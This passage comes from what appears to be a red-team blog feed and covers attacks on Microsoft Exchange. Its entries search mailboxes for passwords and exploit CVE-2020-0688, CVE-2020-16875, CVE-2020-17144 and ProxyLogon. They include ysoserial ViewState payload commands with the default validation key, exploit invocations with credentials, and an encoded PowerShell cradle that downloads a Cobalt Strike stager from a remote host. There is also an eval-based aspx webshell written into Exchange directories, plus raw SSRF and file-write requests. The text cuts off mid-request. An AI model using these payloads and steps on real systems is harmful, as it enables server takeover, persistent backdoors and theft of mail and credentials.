variable">$ExportPath</span><span class="token operator">+</span><span class="token variable">$MailBox</span><span class="token operator">+</span><span class="token string">".pst"</span><span class="token punctuation">)</span> <span class="token operator">-</span>CompletedRequestAgeLimit 0    <span class="token function">Write-Host</span> <span class="token string">"[+] All done."</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Search"><a href="#Search" class="headerlink" title="Search"></a>Search</h2><h3 id="PSSession-2"><a href="#PSSession-2" class="headerlink" title="PSSession"></a>PSSession</h3><pre class="line-numbers language-none"><code class="language-none">the same way to export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.22.png"></p><h3 id="Use-exchange-2"><a href="#Use-exchange-2" class="headerlink" title="Use exchange"></a>Use exchange</h3><pre class="line-numbers language-none"><code class="language-none">all tar to find the keyGet-Mailbox|Search-Mailbox -SearchQuery &quot;*pass*&quot; -EstimateResultOnlyall tar to find the key to export tar user dirGet-Mailbox|Search-Mailbox -SearchQuery &quot;*pass*&quot; -TargetMailbox &quot;user&quot; -TargetFolder &quot;out&quot; -LogLevel Suppresstar user to find the key to export tar user dirSearch-Mailbox -Identity yangsir -SearchQuery &quot;*pass*&quot; -TargetMailbox &quot;user&quot; -TargetFolder &quot;out&quot; -LogLevel Suppress<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ECP"><a href="#ECP" class="headerlink" title="ECP"></a>ECP</h3><pre class="line-numbers language-none"><code class="language-none">let tar user into the Discovery Management group<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.35.png"></p><pre class="line-numbers language-none"><code class="language-none">then go to this module<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.39.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Exchange </tag>
            
            <tag> Information collection </tag>
            
            <tag> Export Email </tag>
            
            <tag> Search Email </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Exchange RCE methods</title>
      <link href="2021/07/29/exchange-rce-methods/"/>
      <url>2021/07/29/exchange-rce-methods/</url>
      
        <content type="html"><![CDATA[<h2 id="Get-exchange-version"><a href="#Get-exchange-version" class="headerlink" title="Get exchange version"></a>Get exchange version</h2><pre class="line-numbers language-none"><code class="language-none">You can get some thing about versionhttps:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-cn&#x2F;exchange&#x2F;new-features&#x2F;build-numbers-and-release-dates?view&#x3D;exchserver-2016<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.30.59.png"></p><pre class="line-numbers language-none"><code class="language-none">Check the source code below, and compare the official website to confirm the relevant version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.31.04.png"></p><h2 id="CVE-2020-17144"><a href="#CVE-2020-17144" class="headerlink" title="CVE-2020-17144"></a>CVE-2020-17144</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><pre class="line-numbers language-none"><code class="language-none">Principle：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;nVtE-OFoO076x6T0147AMw<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Impact-amp-Fix"><a href="#Impact-amp-Fix" class="headerlink" title="Impact&amp;Fix"></a>Impact&amp;Fix</h3><pre class="line-numbers language-none"><code class="language-none">Impact:exchange2010Fix:https:&#x2F;&#x2F;msrc.microsoft.com&#x2F;update-guide&#x2F;vulnerability&#x2F;CVE-2020-17144<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h3><pre class="line-numbers language-none"><code class="language-none">You can use these exphttps:&#x2F;&#x2F;github.com&#x2F;zcgonvh&#x2F;CVE-2020-17144https:&#x2F;&#x2F;github.com&#x2F;Airboi&#x2F;CVE-2020-17144-EXP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.31.10.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.31.56.png"></p><pre class="line-numbers language-none"><code class="language-none">Another can write Memory shell：http:&#x2F;&#x2F;192.168.159.143&#x2F;ews&#x2F;soap&#x2F;?pass&#x3D;whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="CVE-2020-16875"><a href="#CVE-2020-16875" class="headerlink" title="CVE-2020-16875"></a>CVE-2020-16875</h2><h3 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h3><pre class="line-numbers language-none"><code class="language-none">Principle：Incorrect validation of cmDlet parameters and a remote execution code vulnerability in the Microsoft Exchange server. An attacker who successfully exploits this vulnerability can run arbitrary code in the context of a system user. To exploit this vulnerability, you need to have the user rights to authenticate with an Exchange role. Since the Exchange service runs with the System rights, you can also obtain the highest System rights by triggering this vulnerabilityNote：The target user must have the data Loss Prevention permission. Usually, the user in the Exchange Security Groups has the data Loss Prevention permission.Members of exchange Security Groups are usually Exchange administratorsOther users in the organization can also use this interface to execute commands<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Impact-amp-Fix-1"><a href="#Impact-amp-Fix-1" class="headerlink" title="Impact&amp;Fix"></a>Impact&amp;Fix</h3><pre class="line-numbers language-none"><code class="language-none">Impact:exchange2016 cu16、cu17exchange2019 cu5、cu6Fix:https:&#x2F;&#x2F;msrc.microsoft.com&#x2F;update-guide&#x2F;vulnerability&#x2F;CVE-2020-16875<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Actual-use-1"><a href="#Actual-use-1" class="headerlink" title="Actual use"></a>Actual use</h3><pre class="line-numbers language-none"><code class="language-none">Interfaces involving commands&#x2F;ecp&#x2F;DLPpolicy&#x2F;ManagePolicyFromISV.aspx 0688 holes have a regular user of ecp access permissions to delete&#x2F;PowerShell  This interface is used by exchange administrators. This interface cannot be invoked by non-Exchange Seucity Groups members and can only be used for Kerberos authenticationmsf use：https:&#x2F;&#x2F;github.com&#x2F;rapid7&#x2F;metasploit-framework&#x2F;pull&#x2F;14126You can use these exp：https:&#x2F;&#x2F;srcincite.io&#x2F;pocs&#x2F;cve-2020-16875.ps1.txthttps:&#x2F;&#x2F;srcincite.io&#x2F;pocs&#x2F;cve-2020-16875.py.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.32.03.png"></p><h2 id="CVE-2020-0688"><a href="#CVE-2020-0688" class="headerlink" title="CVE-2020-0688"></a>CVE-2020-0688</h2><h3 id="Introduction-2"><a href="#Introduction-2" class="headerlink" title="Introduction"></a>Introduction</h3><pre class="line-numbers language-none"><code class="language-none">Principle：https:&#x2F;&#x2F;www.t00ls.net&#x2F;viewthread.php?tid&#x3D;55183The vulnerability was found in the Exchange Control Panel (ECP) component. Instead of generating random keys with each software installation, all Microsoft Exchange Servers have the same validationKey and decryptionKey in the web.config file after installation. These keys are used to secure ViewState. ViewState, on the other hand, is server-side data that an ASP.NET Web application stores on the client in a serialized format. The client returns this data to the server with the __VIEWSTATE request parameter.Thanks to the use of static keys, an authenticated attacker can trick the target server into deserializing maliciously created ViewState data. With the help of YSoSerial.net, an attacker can execute any.NET code on the Exchange Control Panel Web application. To exploit this vulnerability, we need to collect the ViewStateUserKey and VIEWSTATEGENERATOR values from the authenticated session. The ViewStateUserKey can be retrieved from the ASP.NET cookie, and the VIEWSTATEGENERATOR can be found in a hidden field. All of these can be easily found through tools in your browser.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Impact-amp-Fix-2"><a href="#Impact-amp-Fix-2" class="headerlink" title="Impact&amp;Fix"></a>Impact&amp;Fix</h3><pre class="line-numbers language-none"><code class="language-none">Impact:exchange2010 Service Pack 3exchange2013exchange2016exchange2019Fix:https:&#x2F;&#x2F;msrc.microsoft.com&#x2F;update-guide&#x2F;vulnerability&#x2F;CVE-2020-0688<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Actual-use-2"><a href="#Actual-use-2" class="headerlink" title="Actual use"></a>Actual use</h3><h4 id="Manual-use"><a href="#Manual-use" class="headerlink" title="Manual use"></a>Manual use</h4><pre class="line-numbers language-none"><code class="language-none">Several values are required here:CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF validationKey as defaultConfiguration file C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\ecp\web.config can be found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.32.10.png"></p><pre class="line-numbers language-none"><code class="language-none">Validationalg is the default SHA1__VIEWSTATEGENERATOR is B97B4E27 (available via &#x2F;ecp&#x2F;default.aspx return package, which may have the same value, or it may not be included in the package. Patch KB2919355 is updated with this field, but B97B4E27 is the default)ASP.NET_SessionId: 48fbc032-7ab9-405b-a6c2-c7d78b3ef318 (you can get it from cookie)Use the ysoserial construct statementysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;command&quot; --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator&#x3D;&quot;B97B4E27&quot; --viewstateuserkey&#x3D;&quot;48fbc032-7ab9-405b-a6c2-c7d78b3ef318&quot; --isdebug –islegacyyou will get these:&#x2F;wEy2gYAAQAAAP&#x2F;&#x2F;&#x2F;&#x2F;8BXXXXXXXXXXXXXXXXXXXXXXXXXXXXTz&#x2F;2z4qo6iw&#x3D;&#x3D;then use the url to encode payload add our url you can get these:https:&#x2F;&#x2F;192.168.3.144&#x2F;ecp&#x2F;default.aspx?__VIEWSTATEGENERATOR&#x3D;B97B4E27&amp;__VIEWSTATE&#x3D;%2FwEy2gYAAQAAAPXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXxTz%2F2z4qo6iw%3D%3Dgo to visit the dns log you will known success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.32.16.png"></p><h4 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h4><pre class="line-numbers language-none"><code class="language-none">EXPhttps:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;cve-2020-0688python3 cve-2020-0688.py -s https:&#x2F;&#x2F;192.168.3.144&#x2F;owa -u micle -p Admin12345 -c &quot;ping t00ls.XXXXX&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.32.41.png"></p><pre class="line-numbers language-none"><code class="language-none">use the ysoserialysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;ping t00ls.XXXXX&quot; --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator&#x3D;&quot;B97B4E27&quot; --viewstateuserkey&#x3D;&quot;ea98fbf7-951b-4885-8fb3-00f2cf3a2e73&quot; --isdebug –islegacy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.32.59.png"></p><pre class="line-numbers language-none"><code class="language-none">go to payload <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.33.19.png"></p><pre class="line-numbers language-none"><code class="language-none">your web code should become 500<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.33.24.png"></p><pre class="line-numbers language-none"><code class="language-none">confirm the dns log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.33.29.png"></p><h4 id="CS-online"><a href="#CS-online" class="headerlink" title="CS online"></a>CS online</h4><pre class="line-numbers language-none"><code class="language-none">use powershellpowershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.3.11:801&#x2F;aa&#39;))&quot;you must encode your powershell code，you can get like thispowershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAzAC4AMQAxADoAOAAwADEALwBhAGEAJwApACkAIgA&#x3D;the same way to use python3 cve-2020-0688.py -s https:&#x2F;&#x2F;192.168.3.144&#x2F;owa -u micle -p Admin12345 -c &quot;cmd  &#x2F;c powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAzAC4AMQAxADoAOAAwADEALwBhAGEAJwApACkAIgA&#x3D;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.33.39.png"></p><pre class="line-numbers language-none"><code class="language-none">confir success<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.33.45.png"></p><pre class="line-numbers language-none"><code class="language-none">the same way to use the exe program<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.33.57.png"></p><h4 id="Interactive-shell"><a href="#Interactive-shell" class="headerlink" title="Interactive shell"></a>Interactive shell</h4><pre class="line-numbers language-none"><code class="language-none">EXPhttps:&#x2F;&#x2F;github.com&#x2F;zcgonvh&#x2F;CVE-2020-0688&#x2F;This EXP need the .net environmentExchangeDetect.exe 192.168.3.144 micle Admin12345ExchangeCmd.exe 192.168.3.144 micle Admin12345success like this<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.42.07.png"></p><h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><pre class="line-numbers language-none"><code class="language-none">If you can get an interactive shell then you can maybe to get a webshell First, you must find web dir exec cmd.exe &#x2F;c echo %ExchangeInstallPath%Then, you can write the webshell to aspxexec cmd.exe &#x2F;c echo ^&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;xx&quot;],&quot;unsafe&quot;);%^&gt;&gt;&quot;C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\ecp\LiveIdError.aspx&quot;success like this<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.42.16.png"></p><pre class="line-numbers language-none"><code class="language-none">confirm this is system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.42.23.png"></p><pre class="line-numbers language-none"><code class="language-none">Principle you must write the aspxshell into to the webconfig，but I find other file also to be success like this<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.42.29.png"></p><pre class="line-numbers language-none"><code class="language-none">you can also write into the iis web application dir, like this you we have a webshell Note: if you write the shell in the ecp dir, you must use cookie to connect，if you write the shell in the owa dir like this, you don&#39;t need the cookie to connect!!!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.42.37.png"></p><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><pre class="line-numbers language-none"><code class="language-none">maybe in your PC, you don&#39;t have the py environment，you can use the powershell to success, like this to use the calc.exeexchange -s https:&#x2F;&#x2F;192.168.3.144&#x2F; -u micle@rootkit.org -p Admin12345 -c calc.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.42.42.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.42.56.png"></p><h3 id="Another-can-be-use-dir-amp-VIEWSTATEGENERATOR"><a href="#Another-can-be-use-dir-amp-VIEWSTATEGENERATOR" class="headerlink" title="Another can be use dir &amp; __VIEWSTATEGENERATOR"></a>Another can be use dir &amp; __VIEWSTATEGENERATOR</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;ecp&#x2F;PersonalSettings&#x2F;HomePage.aspx?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;1D01FD4E&#x2F;ecp&#x2F;PersonalSettings&#x2F;HomePage.aspx?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;1D01FD4E&#x2F;ecp&#x2F;Organize&#x2F;AutomaticReplies.slab?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;FD338EE0&#x2F;ecp&#x2F;RulesEditor&#x2F;InboxRules.slab?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;FD338EE0&#x2F;ecp&#x2F;Organize&#x2F;DeliveryReports.slab?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;FD338EE0&#x2F;ecp&#x2F;MyGroups&#x2F;PersonalGroups.aspx?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;A767F62B&#x2F;ecp&#x2F;MyGroups&#x2F;ViewDistributionGroup.aspx?pwmcid&#x3D;1&amp;id&#x3D;38f4bec5-704f-4272-a654-95d53150e2ae&amp;ReturnObjectType&#x3D;1__VIEWSTATEGENERATOR&#x3D;321473B8&#x2F;ecp&#x2F;Customize&#x2F;Messaging.aspx?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;9C5731F0&#x2F;ecp&#x2F;Customize&#x2F;General.aspx?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;72B13321&#x2F;ecp&#x2F;Customize&#x2F;Calendar.aspx?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;4AD51055&#x2F;ecp&#x2F;Customize&#x2F;SentItems.aspx?showhelp&#x3D;false&amp; __VIEWSTATEGENERATOR&#x3D;4466B13F&#x2F;ecp&#x2F;PersonalSettings&#x2F;Password.aspx?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;59543DCA&#x2F;ecp&#x2F;SMS&#x2F;TextMessaging.slab?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;FD338EE0&#x2F;ecp&#x2F;TroubleShooting&#x2F;MobileDevices.slab?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;FD338EE0&#x2F;ecp&#x2F;Customize&#x2F;Regional.aspx?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;9097CD08&#x2F;ecp&#x2F;MyGroups&#x2F;SearchAllGroups.slab?pwmcid&#x3D;3&amp;ReturnObjectType&#x3D;1__VIEWSTATEGENERATOR&#x3D;FD338EE0&#x2F;ecp&#x2F;Security&#x2F;BlockOrAllow.aspx?showhelp&#x3D;false&amp;__VIEWSTATEGENERATOR&#x3D;362253EF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Exchange </tag>
            
            <tag> RCE </tag>
            
            <tag> CVE-2020-17144 </tag>
            
            <tag> CVE-2020-16875 </tag>
            
            <tag> CVE-2020-0688 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ProxyLogon Utilization method (Manual use)</title>
      <link href="2021/07/27/proxylogon-utilization-method-manual-use/"/>
      <url>2021/07/27/proxylogon-utilization-method-manual-use/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">Having written a previous article on successful exploits, in order to figure out what was wrong with the locally built environment that didn&#39;t work, let&#39;s dive into the relevant data packages and principles againNote: There are some problems with the online exp, and the script needs to be modified twice to ensure the success of using it. For example, the following script output is displayed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.43.42.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.44.03.png"></p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">It is known that the project mainly uses two vulnerabilities to obtain permissions, one SSRF and one file writeCve-2021-26855 SSRF, the problem occurs when the client request is proxied to the server, the vulnerability can obtain the user&#39;s SID, the most important step in the non-interactive attack chainCve-2021-27065 File writing, Although the content to be written cannot be completely controlled, the file name and path can be set arbitrarily. When.aspx is written to a file, a Trojan horse can be inserted into the file to achieve remote controlThe process is as follows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.44.11.png"></p><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="CVE-2021–26855-SSRF"><a href="#CVE-2021–26855-SSRF" class="headerlink" title="CVE-2021–26855-SSRF"></a>CVE-2021–26855-SSRF</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET /owa/auth/yyyyyy.js HTTP/1.1Host: mail.yangsir.gitUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> WOW64<span class="token punctuation">;</span> rv:47.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/47.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.3</span>Accept-Encoding: gzip, deflateDNT: <span class="token number">1</span>Referer: https://mail.yangsir.git/owa/auth/logon.aspx?url<span class="token operator">=</span>https%3a%2f%2fmail.yangsir.git%2fecp%2f%3fexsvurl%3d1%26p%3dVirtualDirectories<span class="token operator">&amp;</span><span class="token assign-left variable">reason</span><span class="token operator">=</span><span class="token number">0</span>Cookie: X-AnonResource<span class="token operator">=</span>true<span class="token punctuation">;</span> X-AnonResource-Backend<span class="token operator">=</span>lg5vmst556l4ut5hg01cdlo6txzqnf.burpcollaborator.net/ecp/default.flt?~3X-Forwarded-For: <span class="token number">8.8</span>.8.8Connection: closeCache-Control: max-age<span class="token operator">=</span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.44.18.png"></p><h3 id="CVE-2021-27065-File-writing"><a href="#CVE-2021-27065-File-writing" class="headerlink" title="CVE-2021-27065-File writing"></a>CVE-2021-27065-File writing</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">The OAB external URL writes Trojan contentPOST /ecp/DDI/DDIService.svc/SetObject?ActivityCorrelationID<span class="token operator">=</span>e9cf840e-e595-facd-3710-afbe2aad22a8<span class="token operator">&amp;</span><span class="token assign-left variable">schema</span><span class="token operator">=</span>OABVirtualDirectory<span class="token operator">&amp;</span><span class="token assign-left variable">msExchEcpCanary</span><span class="token operator">=</span>54aREH4XW064p9E_YOEzj0AzPh6oUNkIW6PI1a8ziUpOwNZMxxxhaQeRm8wzpYDo18aE9sIw1FY. HTTP/1.1Host: mail.yangsir.gitUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> WOW64<span class="token punctuation">;</span> rv:47.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/47.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.3</span>Accept-Encoding: gzip, deflateDNT: <span class="token number">1</span>X-Requested-With: XMLHttpRequestContent-Type: application/json<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span 